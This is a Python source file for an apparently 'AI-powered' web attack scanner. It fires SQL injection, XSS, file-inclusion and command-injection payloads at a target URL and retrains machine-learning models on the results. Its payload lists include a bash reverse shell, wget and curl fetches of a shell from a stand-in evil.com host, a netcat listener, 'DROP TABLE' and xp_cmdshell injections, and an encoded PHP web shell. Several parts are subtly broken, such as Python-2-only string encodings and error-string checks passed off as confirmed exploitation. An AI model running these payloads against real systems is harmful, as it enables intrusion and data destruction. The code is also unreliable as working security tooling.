"""
AI-Powered Intelligent Penetration Testing Scanner
Uses machine learning to learn from previous attacks and adapt techniques
"""

import numpy as np
import joblib
import pickle
from typing import Dict, List, Any, Optional, Tuple
from datetime import datetime, timedelta
import requests
import json
import hashlib
import time
import random
from dataclasses import dataclass
from enum import Enum
import logging

from sklearn.ensemble import RandomForestClassifier, GradientBoostingClassifier
from sklearn.neural_network import MLPClassifier
from sklearn.preprocessing import StandardScaler
from sklearn.model_selection import train_test_split
from sklearn.metrics import accuracy_score, precision_recall_fscore_support
import tensorflow as tf
from tensorflow import keras
from tensorflow.keras import layers

logger = logging.getLogger(__name__)


class AttackType(Enum):
    """Types of attacks the AI can perform."""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    CSRF = "csrf"
    LFI_RFI = "lfi_rfi"
    COMMAND_INJECTION = "command_injection"
    BUFFER_OVERFLOW = "buffer_overflow"
    PRIVILEGE_ESCALATION = "privilege_escalation"
    SOCIAL_ENGINEERING = "social_engineering"
    ZERO_DAY = "zero_day"


@dataclass
class AttackResult:
    """Result of an attack attempt."""
    attack_type: AttackType
    target: str
    payload: str
    success: bool
    response_code: int
    response_time: float
    error_message: Optional[str] = None
    extracted_data: Optional[Dict] = None
    bypass_technique: Optional[str] = None
    timestamp: datetime = None
    
    def __post_init__(self):
        if self.timestamp is None:
            self.timestamp = datetime.now()


class IntelligentScanner:
    """
    AI-powered scanner that learns from previous attacks and adapts techniques.
    """
    
    def __init__(self, model_path: str = "models/intelligent_scanner.pkl"):
        self.model_path = model_path
        self.models = {}
        self.scalers = {}
        self.attack_history = []
        self.success_patterns = {}
        self.failure_patterns = {}
        self.adaptive_payloads = {}
        self.session_data = {}
        
        # Load or initialize models
        self._initialize_models()
        
        # Initialize neural network for deep learning
        self._initialize_neural_network()
    
    def _initialize_models(self):
        """Initialize machine learning models for different attack types."""
        try:
            # Try to load existing models
            with open(self.model_path, 'rb') as f:
                saved_data = pickle.load(f)
                self.models = saved_data.get('models', {})
                self.scalers = saved_data.get('scalers', {})
                self.attack_history = saved_data.get('history', [])
                self.success_patterns = saved_data.get('success_patterns', {})
                self.failure_patterns = saved_data.get('failure_patterns', {})
                logger.info("Loaded existing AI models and patterns")
        except FileNotFoundError:
            logger.info("Initializing new AI models")
            self._create_new_models()
    
    def _create_new_models(self):
        """Create new machine learning models."""
        for attack_type in AttackType:
            # Random Forest for classification
            self.models[f"{attack_type.value}_rf"] = RandomForestClassifier(
                n_estimators=100,
                max_depth=10,
                random_state=42
            )
            
            # Gradient Boosting for regression
            self.models[f"{attack_type.value}_gb"] = GradientBoostingClassifier(
                n_estimators=100,
                max_depth=5,
                random_state=42
            )
            
            # Scaler for feature normalization
            self.scalers[attack_type.value] = StandardScaler()
    
    def _initialize_neural_network(self):
        """Initialize deep learning neural network."""
        self.neural_network = keras.Sequential([
            layers.Dense(128, activation='relu', input_shape=(50,)),
            layers.Dropout(0.3),
            layers.Dense(64, activation='relu'),
            layers.Dropout(0.2),
            layers.Dense(32, activation='relu'),
            layers.Dense(1, activation='sigmoid')
        ])
        
        self.neural_network.compile(
            optimizer='adam',
            loss='binary_crossentropy',
            metrics=['accuracy']
        )
    
    def extract_features(self, target: str, payload: str, response: requests.Response) -> np.ndarray:
        """Extract features from attack attempt for ML training."""
        features = []
        
        # Target features
        features.extend([
            len(target),
            target.count('.'),
            target.count(':'),
            target.count('/'),
            target.count('?'),
            target.count('='),
            target.count('&'),
        ])
        
        # Payload features
        features.extend([
            len(payload),
            payload.count("'"),
            payload.count('"'),
            payload.count(';'),
            payload.count('--'),
            payload.count('/*'),
            payload.count('*/'),
            payload.count('union'),
            payload.count('select'),
            payload.count('insert'),
            payload.count('update'),
            payload.count('delete'),
            payload.count('drop'),
            payload.count('exec'),
            payload.count('eval'),
            payload.count('script'),
            payload.count('javascript'),
            payload.count('onload'),
            payload.count('onerror'),
            payload.count('onclick'),
        ])
        
        # Response features
        features.extend([
            response.status_code,
            len(response.text),
            response.elapsed.total_seconds(),
            response.headers.get('content-length', 0),
            response.headers.get('content-type', '').count('html'),
            response.headers.get('content-type', '').count('json'),
            response.headers.get('content-type', '').count('xml'),
            response.text.count('error'),
            response.text.count('exception'),
            response.text.count('warning'),
            response.text.count('success'),
            response.text.count('failed'),
            response.text.count('invalid'),
            response.text.count('unauthorized'),
            response.text.count('forbidden'),
            response.text.count('not found'),
            response.text.count('internal server error'),
            response.text.count('database'),
            response.text.count('sql'),
            response.text.count('mysql'),
            response.text.count('postgresql'),
            response.text.count('oracle'),
        ])
        
        # Pad to 50 features
        while len(features) < 50:
            features.append(0)
        
        return np.array(features[:50])
    
    def predict_success_probability(self, target: str, payload: str, attack_type: AttackType) -> float:
        """Predict the probability of success for an attack."""
        try:
            # Make a test request to extract features
            test_response = requests.get(target, timeout=5)
            features = self.extract_features(target, payload, test_response)
            
            # Scale features
            scaler = self.scalers.get(attack_type.value)
            if scaler:
                features_scaled = scaler.transform(features.reshape(1, -1))
            else:
                features_scaled = features.reshape(1, -1)
            
            # Get predictions from all models
            predictions = []
            
            # Random Forest prediction
            rf_model = self.models.get(f"{attack_type.value}_rf")
            if rf_model:
                pred = rf_model.predict_proba(features_scaled)[0][1]
                predictions.append(pred)
            
            # Gradient Boosting prediction
            gb_model = self.models.get(f"{attack_type.value}_gb")
            if gb_model:
                pred = gb_model.predict_proba(features_scaled)[0][1]
                predictions.append(pred)
            
            # Neural network prediction
            nn_pred = self.neural_network.predict(features_scaled.astype(np.float32))[0][0]
            predictions.append(nn_pred)
            
            # Return average prediction
            return np.mean(predictions) if predictions else 0.5
            
        except Exception as e:
            logger.error(f"Error predicting success probability: {e}")
            return 0.5
    
    def generate_adaptive_payload(self, target: str, attack_type: AttackType, previous_failures: List[str]) -> str:
        """Generate adaptive payload based on learning from previous failures."""
        
        # Base payloads for different attack types
        base_payloads = {
            AttackType.SQL_INJECTION: [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' OR 1=1#",
                "' OR 1=1--",
                "admin'--",
                "admin'#",
                "admin'/*",
                "' OR 'x'='x",
                "'; EXEC xp_cmdshell('dir')--"
            ],
            AttackType.XSS: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<details open ontoggle=alert('XSS')>",
                "<video><source onerror=alert('XSS')>"
            ],
            AttackType.LFI_RFI: [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "php://filter/convert.base64-encode/resource=index.php",
                "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOz8+",
                "expect://id",
                "input://",
                "phar://",
                "zip://",
                "file:///etc/passwd",
                "http://evil.com/shell.txt"
            ],
            AttackType.COMMAND_INJECTION: [
                "; ls",
                "| whoami",
                "& dir",
                "&& cat /etc/passwd",
                "|| ping -c 1 127.0.0.1",
                "; wget http://evil.com/shell",
                "| nc -l 4444",
                "& powershell -c \"Invoke-WebRequest\"",
                "; curl http://evil.com/shell",
                "| bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
            ]
        }
        
        payloads = base_payloads.get(attack_type, [])
        
        # Apply adaptive modifications based on previous failures
        adaptive_payloads = []
        for payload in payloads:
            # Encoding variations
            adaptive_payloads.extend([
                payload,
                payload.replace("'", "\\'"),
                payload.replace("'", "''"),
                payload.replace("'", "%27"),
                payload.replace("'", "&#39;"),
                payload.replace("<", "&lt;"),
                payload.replace(">", "&gt;"),
                payload.replace("\"", "&quot;"),
                payload.replace("&", "&amp;"),
                payload.encode('hex').decode(),
                payload.encode('base64').decode(),
                payload.encode('rot13'),
                payload.replace(" ", "+"),
                payload.replace(" ", "%20"),
                payload.replace(" ", "&#32;"),
            ])
        
        # Add learned bypass techniques
        bypass_techniques = self.success_patterns.get(attack_type.value, [])
        for technique in bypass_techniques:
            adaptive_payloads.append(technique)
        
        # Remove previously failed payloads
        adaptive_payloads = [p for p in adaptive_payloads if p not in previous_failures]
        
        # Return random payload with higher probability for successful patterns
        if adaptive_payloads:
            # Weight successful patterns higher
            weights = []
            for payload in adaptive_payloads:
                if payload in bypass_techniques:
                    weights.append(3.0)  # Higher weight for successful patterns
                else:
                    weights.append(1.0)
            
            return random.choices(adaptive_payloads, weights=weights)[0]
        
        return random.choice(payloads) if payloads else ""
    
    def learn_from_result(self, result: AttackResult):
        """Learn from attack result to improve future attacks."""
        self.attack_history.append(result)
        
        # Update success/failure patterns
        if result.success:
            if result.attack_type.value not in self.success_patterns:
                self.success_patterns[result.attack_type.value] = []
            self.success_patterns[result.attack_type.value].append(result.payload)
            
            # Store bypass technique if found
            if result.bypass_technique:
                self.success_patterns[result.attack_type.value].append(result.bypass_technique)
        else:
            if result.attack_type.value not in self.failure_patterns:
                self.failure_patterns[result.attack_type.value] = []
            self.failure_patterns[result.attack_type.value].append(result.payload)
        
        # Retrain models periodically
        if len(self.attack_history) % 10 == 0:
            self._retrain_models()
    
    def _retrain_models(self):
        """Retrain machine learning models with new data."""
        try:
            # Prepare training data
            X = []
            y = []
            
            for result in self.attack_history:
                # Make a test request to get features
                try:
                    test_response = requests.get(result.target, timeout=5)
                    features = self.extract_features(result.target, result.payload, test_response)
                    X.append(features)
                    y.append(1 if result.success else 0)
                except:
                    continue
            
            if len(X) < 5:  # Need minimum data to train
                return
            
            X = np.array(X)
            y = np.array(y)
            
            # Split data
            X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)
            
            # Retrain models for each attack type
            for attack_type in AttackType:
                attack_results = [r for r in self.attack_history if r.attack_type == attack_type]
                if len(attack_results) < 3:
                    continue
                
                # Scale features
                scaler = self.scalers[attack_type.value]
                X_train_scaled = scaler.fit_transform(X_train)
                X_test_scaled = scaler.transform(X_test)
                
                # Retrain Random Forest
                rf_model = self.models[f"{attack_type.value}_rf"]
                rf_model.fit(X_train_scaled, y_train)
                
                # Retrain Gradient Boosting
                gb_model = self.models[f"{attack_type.value}_gb"]
                gb_model.fit(X_train_scaled, y_train)
                
                # Retrain Neural Network
                self.neural_network.fit(
                    X_train_scaled.astype(np.float32),
                    y_train.astype(np.float32),
                    epochs=5,
                    batch_size=32,
                    verbose=0
                )
                
                # Evaluate models
                rf_pred = rf_model.predict(X_test_scaled)
                gb_pred = gb_model.predict(X_test_scaled)
                nn_pred = (self.neural_network.predict(X_test_scaled.astype(np.float32)) > 0.5).astype(int)
                
                logger.info(f"Model accuracy for {attack_type.value}: RF={accuracy_score(y_test, rf_pred):.3f}, "
                           f"GB={accuracy_score(y_test, gb_pred):.3f}, NN={accuracy_score(y_test, nn_pred):.3f}")
            
            # Save updated models
            self._save_models()
            
        except Exception as e:
            logger.error(f"Error retraining models: {e}")
    
    def _save_models(self):
        """Save trained models and patterns."""
        try:
            save_data = {
                'models': self.models,
                'scalers': self.scalers,
                'history': self.attack_history,
                'success_patterns': self.success_patterns,
                'failure_patterns': self.failure_patterns
            }
            
            with open(self.model_path, 'wb') as f:
                pickle.dump(save_data, f)
            
            logger.info("Models saved successfully")
        except Exception as e:
            logger.error(f"Error saving models: {e}")
    
    def intelligent_attack(self, target: str, attack_type: AttackType, max_attempts: int = 50) -> List[AttackResult]:
        """Perform intelligent attack with learning and adaptation."""
        results = []
        previous_failures = []
        
        logger.info(f"Starting intelligent {attack_type.value} attack on {target}")
        
        for attempt in range(max_attempts):
            # Generate adaptive payload
            payload = self.generate_adaptive_payload(target, attack_type, previous_failures)
            
            # Predict success probability
            success_prob = self.predict_success_probability(target, payload, attack_type)
            
            logger.info(f"Attempt {attempt + 1}: Success probability = {success_prob:.3f}")
            
            # Skip low probability attempts unless we're desperate
            if success_prob < 0.1 and attempt < max_attempts - 10:
                continue
            
            # Execute attack
            result = self._execute_attack(target, payload, attack_type)
            results.append(result)
            
            # Learn from result
            self.learn_from_result(result)
            
            if result.success:
                logger.info(f"✅ Attack successful! Payload: {payload}")
                break
            else:
                previous_failures.append(payload)
                logger.info(f"❌ Attack failed. Trying adaptive approach...")
            
            # Adaptive delay
            time.sleep(random.uniform(0.5, 2.0))
        
        return results
    
    def _execute_attack(self, target: str, payload: str, attack_type: AttackType) -> AttackResult:
        """Execute a single attack attempt."""
        start_time = time.time()
        
        try:
            if attack_type == AttackType.SQL_INJECTION:
                result = self._sql_injection_attack(target, payload)
            elif attack_type == AttackType.XSS:
                result = self._xss_attack(target, payload)
            elif attack_type == AttackType.LFI_RFI:
                result = self._lfi_rfi_attack(target, payload)
            elif attack_type == AttackType.COMMAND_INJECTION:
                result = self._command_injection_attack(target, payload)
            else:
                result = self._generic_attack(target, payload)
            
            result.response_time = time.time() - start_time
            return result
            
        except Exception as e:
            return AttackResult(
                attack_type=attack_type,
                target=target,
                payload=payload,
                success=False,
                response_code=0,
                response_time=time.time() - start_time,
                error_message=str(e)
            )
    
    def _sql_injection_attack(self, target: str, payload: str) -> AttackResult:
        """Execute SQL injection attack."""
        # Test for SQL injection vulnerabilities
        test_urls = [
            f"{target}?id={payload}",
            f"{target}?user={payload}",
            f"{target}?search={payload}",
            f"{target}?q={payload}",
            f"{target}?param={payload}"
        ]
        
        for url in test_urls:
            try:
                response = requests.get(url, timeout=10)
                
                # Check for SQL error messages
                error_indicators = [
                    "sql syntax", "mysql", "oracle", "postgresql", "sqlite",
                    "syntax error", "mysql_fetch", "mysql_num_rows",
                    "mysql_result", "mysql_query", "mysql_connect"
                ]
                
                success = any(indicator in response.text.lower() for indicator in error_indicators)
                
                return AttackResult(
                    attack_type=AttackType.SQL_INJECTION,
                    target=url,
                    payload=payload,
                    success=success,
                    response_code=response.status_code,
                    response_time=response.elapsed.total_seconds(),
                    extracted_data={"response_text": response.text[:500]} if success else None
                )
                
            except requests.RequestException:
                continue
        
        return AttackResult(
            attack_type=AttackType.SQL_INJECTION,
            target=target,
            payload=payload,
            success=False,
            response_code=0,
            response_time=0
        )
    
    def _xss_attack(self, target: str, payload: str) -> AttackResult:
        """Execute XSS attack."""
        # Test for XSS vulnerabilities
        test_data = {
            "search": payload,
            "comment": payload,
            "message": payload,
            "input": payload,
            "text": payload
        }
        
        try:
            response = requests.post(target, data=test_data, timeout=10)
            
            # Check if payload is reflected in response
            success = payload in response.text
            
            return AttackResult(
                attack_type=AttackType.XSS,
                target=target,
                payload=payload,
                success=success,
                response_code=response.status_code,
                response_time=response.elapsed.total_seconds(),
                extracted_data={"response_text": response.text[:500]} if success else None
            )
            
        except requests.RequestException as e:
            return AttackResult(
                attack_type=AttackType.XSS,
                target=target,
                payload=payload,
                success=False,
                response_code=0,
                response_time=0,
                error_message=str(e)
            )
    
    def _lfi_rfi_attack(self, target: str, payload: str) -> AttackResult:
        """Execute LFI/RFI attack."""
        # Test for file inclusion vulnerabilities
        test_urls = [
            f"{target}?file={payload}",
            f"{target}?page={payload}",
            f"{target}?include={payload}",
            f"{target}?path={payload}",
            f"{target}?doc={payload}"
        ]
        
        for url in test_urls:
            try:
                response = requests.get(url, timeout=10)
                
                # Check for file inclusion indicators
                success_indicators = [
                    "root:", "bin:", "etc/passwd", "windows/system32",
                    "php://", "data://", "expect://", "input://"
                ]
                
                success = any(indicator in response.text for indicator in success_indicators)
                
                return AttackResult(
                    attack_type=AttackType.LFI_RFI,
                    target=url,
                    payload=payload,
                    success=success,
                    response_code=response.status_code,
                    response_time=response.elapsed.total_seconds(),
                    extracted_data={"response_text": response.text[:500]} if success else None
                )
                
            except requests.RequestException:
                continue
        
        return AttackResult(
            attack_type=AttackType.LFI_RFI,
            target=target,
            payload=payload,
            success=False,
            response_code=0,
            response_time=0
        )
    
    def _command_injection_attack(self, target: str, payload: str) -> AttackResult:
        """Execute command injection attack."""
        # Test for command injection vulnerabilities
        test_data = {
            "cmd": payload,
            "command": payload,
            "exec": payload,
            "system": payload,
            "shell": payload
        }
        
        try:
            response = requests.post(target, data=test_data, timeout=10)
            
            # Check for command execution indicators
            success_indicators = [
                "uid=", "gid=", "groups=", "root", "administrator",
                "windows", "linux", "unix", "command", "execution"
            ]
            
            success = any(indicator in response.text.lower() for indicator in success_indicators)
            
            return AttackResult(
                attack_type=AttackType.COMMAND_INJECTION,
                target=target,
                payload=payload,
                success=success,
                response_code=response.status_code,
                response_time=response.elapsed.total_seconds(),
                extracted_data={"response_text": response.text[:500]} if success else None
            )
            
        except requests.RequestException as e:
            return AttackResult(
                attack_type=AttackType.COMMAND_INJECTION,
                target=target,
                payload=payload,
                success=False,
                response_code=0,
                response_time=0,
                error_message=str(e)
            )
    
    def _generic_attack(self, target: str, payload: str) -> AttackResult:
        """Execute generic attack."""
        try:
            response = requests.get(target, timeout=10)
            
            return AttackResult(
                attack_type=AttackType.SQL_INJECTION,  # Default
                target=target,
                payload=payload,
                success=False,
                response_code=response.status_code,
                response_time=response.elapsed.total_seconds()
            )
            
        except requests.RequestException as e:
            return AttackResult(
                attack_type=AttackType.SQL_INJECTION,  # Default
                target=target,
                payload=payload,
                success=False,
                response_code=0,
                response_time=0,
                error_message=str(e)
            )
    
    def get_attack_statistics(self) -> Dict[str, Any]:
        """Get statistics about attack performance."""
        if not self.attack_history:
            return {"message": "No attack history available"}
        
        total_attacks = len(self.attack_history)
        successful_attacks = len([r for r in self.attack_history if r.success])
        success_rate = successful_attacks / total_attacks if total_attacks > 0 else 0
        
        attack_type_stats = {}
        for attack_type in AttackType:
            type_attacks = [r for r in self.attack_history if r.attack_type == attack_type]
            if type_attacks:
                type_success = len([r for r in type_attacks if r.success])
                attack_type_stats[attack_type.value] = {
                    "total": len(type_attacks),
                    "successful": type_success,
                    "success_rate": type_success / len(type_attacks)
                }
        
        return {
            "total_attacks": total_attacks,
            "successful_attacks": successful_attacks,
            "overall_success_rate": success_rate,
            "attack_type_statistics": attack_type_stats,
            "success_patterns_count": {k: len(v) for k, v in self.success_patterns.items()},
            "failure_patterns_count": {k: len(v) for k, v in self.failure_patterns.items()}
        } 